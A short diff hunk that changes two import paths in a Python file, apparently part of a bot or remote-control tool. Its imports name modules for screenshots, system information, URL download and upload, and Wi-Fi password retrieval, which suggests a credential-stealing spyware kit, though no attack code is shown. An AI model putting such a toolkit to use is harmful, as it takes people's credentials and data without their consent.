@@ -3,8 +3,8 @@ import importlib
 
 from mods.screenshot import screenshot
 from mods.systeminfo import systeminfo
-from mods.urlDownload import urlDownload
-from mods.urlUploader import UrlUploader
+from bot.mods.download import urlDownload
+from bot.mods.upload import UrlUploader
 from mods.wifi import WifiPasswordRetriever
 
 from externals.templates import helper_template
